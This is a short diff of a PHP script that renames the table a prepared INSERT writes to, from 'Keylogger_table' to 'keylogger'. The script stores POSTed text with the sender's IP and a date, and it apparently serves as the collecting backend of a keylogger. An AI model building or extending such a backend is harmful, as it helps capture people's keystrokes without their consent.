@@ -10,7 +10,7 @@ try {
 	{
 		$input = $_POST["text"];
 		// Send information
-		$stmt = $dbh->prepare("INSERT INTO Keylogger_table (ip, dat, record) VALUES (:ip, :dat, :record)");
+		$stmt = $dbh->prepare("INSERT INTO keylogger (ip, dat, record) VALUES (:ip, :dat, :record)");
 		$stmt->bindParam(':ip', $ip);
 		$stmt->bindParam(':dat', $dat);
 		$stmt->bindParam(':record', $input);
